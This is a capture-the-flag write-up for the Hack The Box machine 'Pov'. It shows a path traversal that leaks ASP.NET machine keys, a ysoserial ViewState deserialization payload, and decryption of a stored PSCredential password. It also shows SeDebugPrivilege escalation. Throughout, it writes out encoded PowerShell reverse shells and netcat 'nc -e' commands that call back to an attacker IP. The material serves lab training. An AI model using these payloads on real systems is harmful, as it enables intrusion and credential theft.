# Pov
- pov.htb


## NMAP
```
nmap -sVC 10.129.230.183 -Pn -p-
Starting Nmap 7.93 ( https://nmap.org ) at 2025-12-12 10:05 EST
Nmap scan report for 10.129.230.183
Host is up (0.022s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: pov.htb
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

## Foothold
- sudo go run cmd/shortscan/main.go http://pov.htb --fullurl
    - found `web.config`
- dir enum found nothing
- vhost scan found dev.pov.htb
- sudo go run cmd/shortscan/main.go http://dev.pov.htb --fullurl
    - found `web.config`
- going through the website at dev.pov.htb
    - there is a post request to download `cv.pdf`
    - sent to burp and found a path traversal vulnerability
    - can go to absolute paths like `C:\Windows\System32\drivers\etc\hosts`
        - only pov.htb and dev.pov.htb
    - since we know from shortscan that there is a web.config in dev.pov.htb as well - `download=..\web.config`
    ```
    <configuration>
    <system.web>
        <customErrors mode="On" defaultRedirect="default.aspx" />
        <httpRuntime targetFramework="4.5" />
        <machineKey decryption="AES" decryptionKey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" validation="SHA1" validationKey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" />
    </system.web>
    <system.webServer>
            <httpErrors>
                <remove statusCode="403" subStatusCode="-1" />
                <error statusCode="403" prefixLanguageFilePath="" path="http://dev.pov.htb:8080/portfolio" responseMode="Redirect" />
            </httpErrors>
            <httpRedirect enabled="true" destination="http://dev.pov.htb/portfolio" exactDestination="false" childOnly="true" />
        </system.webServer>
    </configuration>
    ```
- 
- https://github.com/mchklt/CVE-2025-30406
    - found the generator value at `/portfolio/contact.aspx`
    ```
    <input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="37310E71" />
    ```
    - get powershell revershell on 9001
    - build wine - https://medium.com/@hypri0n/run-ysoserial-exe-on-kali-linux-47b344ddff27
    - `wine ysoserial.exe -p ViewState -g WindowsIdentity --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" --path="/portfolio" -c "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQA4ADMAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"`
    - copy the base64 response upto ==
    - start nc on 9001
    - in the file path traversal request, modify the VIEWSTATE parameter with above b64 response and send
    - get reverse shell as sfitz.

### Part 2
- ran  jaws.enum
- we see winrm port is open
- `C:\Users\sfitz\Documents\connection.xml`
```
cat connection.xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">alaading</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6</SS>
    </Props>
  </Obj>
</Objs>

```
- decrypting creds from a credential.xml file
```
$Credxmlpath = "C:\Users\sfitz\Documents\connection.xml"
$Credential = Import-CliXml -Path $Credxmlpath
$plainTextPassword = $Credential.GetNetworkCredential().Password

$plainTextPassword
```
- we get `alaading:f8gQ8fynP44ek1m3`
- `runas /user:alaading cmd.exe "C:\temp\nc.exe -e cmd.exe 10.10.14.183 9090"`
```
$Pword = ConvertTo-SecureString "f8gQ8fynP44ek1m3" -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential("alaading", $Pword)
Start-Process -FilePath "C:\temp\nc.exe" -ArgumentList "-e cmd.exe 10.10.14.183 9090" -Credential $Cred
[OR]
Invoke-Command -ScriptBlock {C:\temp\nc.exe 10.10.14.183 9090 -e powershell.exe} -Credential $Cred -computername localhost
```
- `.\RunasCs.exe alaading f8gQ8fynP44ek1m3 cmd.exe -r 10.10.14.183:9090`
- 06fe82f27efc20b34c2367a3fc3d6aa1

## PrivEsc
- `whoami /priv` - SeDebugPrivilege (shows disabled)
- tried disabling it:
```
powershell -ep bypass .\EnableAllTokenPrivs.ps1
Import-Module .\Enable-Privilege.ps1
.\EnableAllTokenPrivs.ps1
```
- nothing works but when we check with cmd.exe we see that sedebugpriv is enabled
- going forward with the exploitation
- `(Get-Process "winlogon").Id` - 556
- `.\psgetsys.ps1`
- `ImpersonateFromParentPid -ppid 540 -command "C:\temp\nc.exe" -cmdargs "-e powershell.exe 10.10.14.183 4433"`
- `ImpersonateFromParentPid -ppid 540 -command "C:\temp\nc.exe" -cmdargs "10.10.14.183 4433 -e cmd.exe"`
- `ImpersonateFromParentPid -ppid 540 -command "C:\Windows\System32\cmd.exe" -cmdargs "/c powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQA4ADMAIgAsADQANAAzADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"`
- `ImpersonateFromParentPid -ppid 540 -command "C:\Windows\System32\cmd.exe" -cmdargs ""`

- THE ImpersonateFromParentPid method did not work with a 122 error code.

- used the MetaSploit method to get a reverse shell and root.txt - 935a490064030f31399fa9cfc372c5e5
